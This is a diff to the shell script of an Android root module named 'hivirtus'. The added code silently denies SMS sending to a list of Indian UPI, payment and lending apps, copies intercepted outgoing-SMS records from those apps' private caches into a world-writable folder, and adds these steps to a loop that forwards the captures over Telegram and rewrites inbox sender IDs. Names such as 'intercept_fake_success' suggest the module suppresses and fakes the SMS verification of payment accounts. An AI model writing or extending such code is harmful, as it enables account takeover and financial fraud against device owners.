@@ -349,9 +349,58 @@ hivirtus_apatch_allow_upi_inject 2>/dev/null &
   done
 ) &
 
-# DISABLED: appops SEND_SMS deny — system/SIM break + "sab apps hooked" feel
-# SMS intercept sirf Zygisk client hook se (UPI process me)
-enforce_sms_block() { return 0; }
+# DISABLED was wrong for Hero SENDTO miss — UPI-only SEND_SMS deny as safety net
+# (Messages app still can send; Intent/ISms hooks must catch compose. This blocks direct SmsManager.)
+enforce_sms_block() {
+  local on=0
+  if [ -f "$RUNTIME" ]; then
+    grep -q '"intercept_fake_success"[[:space:]]*:[[:space:]]*true' "$RUNTIME" 2>/dev/null && on=1
+    grep -q '"hook_outgoing_sms"[[:space:]]*:[[:space:]]*true' "$RUNTIME" 2>/dev/null && on=1
+  fi
+  [ "$on" = "0" ] && [ -f /data/local/tmp/hivirtus_ui_save.json ] && \
+    grep -q '"intercept_fake_success"[[:space:]]*:[[:space:]]*true' /data/local/tmp/hivirtus_ui_save.json 2>/dev/null && on=1
+  # Default ON when no config readable
+  [ "$on" = "0" ] && [ ! -f "$RUNTIME" ] && [ ! -f /data/local/tmp/hivirtus_ui_save.json ] && on=1
+  [ "$on" = "0" ] && return 0
+
+  for pkg in \
+    com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
+    com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
+    com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android
+  do
+    pm path "$pkg" >/dev/null 2>&1 || continue
+    appops set "$pkg" SEND_SMS ignore 2>/dev/null || \
+      cmd appops set "$pkg" SEND_SMS ignore 2>/dev/null || true
+  done
+}
+
+# Promote blocked JSON from app code_cache / module dir → tmp (A16 app can't write tmp)
+harvest_blocked_outgoing() {
+  for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
+             com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
+             com.myairtelapp com.yespay.next com.kreditbee.android com.stashfin.android; do
+    for f in \
+      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
+      "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
+      "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag"
+    do
+      [ -f "$f" ] && [ -s "$f" ] || continue
+      bn=$(basename "$f")
+      cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
+      chmod 666 "/data/local/tmp/$bn" 2>/dev/null
+    done
+  done
+  for f in "$MODDIR/hivirtus_outgoing_blocked.json" "$MODDIR/hivirtus_outgoing_blocked.flag" \
+           "$MODDIR/outgoing_blocked.json"; do
+    [ -f "$f" ] && [ -s "$f" ] || continue
+    case "$f" in
+      *.json) cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null ;;
+      *.flag) cp -f "$f" /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null ;;
+    esac
+    chmod 666 /data/local/tmp/hivirtus_outgoing_blocked.json /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null
+  done
+}
 
 seed_hooked_pkgs() { return 0; }
 seed_apatch_config() { return 0; }
@@ -456,6 +505,15 @@ ${ONE_TAP}"
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
     rm -f /data/local/tmp/hivirtus_pending_verify.json
     rm -f "$PAYLOAD"
+    # Also clear app code_cache copies so harvest doesn't re-forward
+    for pkg in com.herofincorp.diyjourneys com.phonepe.app \
+               com.google.android.apps.nbu.paisa.user net.one97.paytm; do
+      rm -f "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
+            "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
+            "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
+            "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" 2>/dev/null
+    done
+    rm -f "$MODDIR/hivirtus_outgoing_blocked.json" "$MODDIR/hivirtus_outgoing_blocked.flag" 2>/dev/null
     echo "tg_ok $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
     chmod 644 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
   else
@@ -627,8 +685,10 @@ rewrite_inbox_sender_id() {
 (
   while true; do
     send_tg_test_if_requested
+    harvest_blocked_outgoing
     forward_blocked_telegram
     rewrite_inbox_sender_id
+    enforce_sms_block
     hivirtus_tg_watchdog 2>/dev/null
     sleep 2
   done
